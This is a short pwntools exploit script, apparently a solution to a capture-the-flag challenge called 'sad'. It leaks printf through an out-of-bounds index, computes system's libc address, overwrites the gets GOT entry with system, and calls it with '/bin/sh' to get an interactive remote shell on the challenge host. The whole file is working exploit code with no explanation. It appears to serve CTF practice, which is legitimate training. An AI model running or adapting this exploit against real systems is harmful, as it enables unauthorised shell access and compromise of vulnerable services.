from pwn import *
import struct

p64 = lambda x : struct.pack("Q",x)
u64 = lambda x : struct.unpack("Q",x)[0]
elf = ELF("../src/bin/sad")
r = remote('challs.sieberr.live', 1006)

#leak printf
r.sendline("1")
r.recv()
r.sendline("-11")
r.recvuntil("]: ")
printf = u64(r.recv(6).ljust(8,b"\x00"))
system = printf - (0x606f0 - 0x50d70)
log.info(f"printf @ {hex(printf)}")
log.info(f"system @ {hex(system)}")

#overwrite an entry with /bin/sh
r.sendline("2")
r.sendline("1")
r.sendline("/bin/sh")

#overwrite gets got with system
r.sendline("2")
r.sendline("-10")
r.sendline(p64(system))

# call system("/bin/sh")
r.sendline("2")
r.sendline("1")
r.interactive()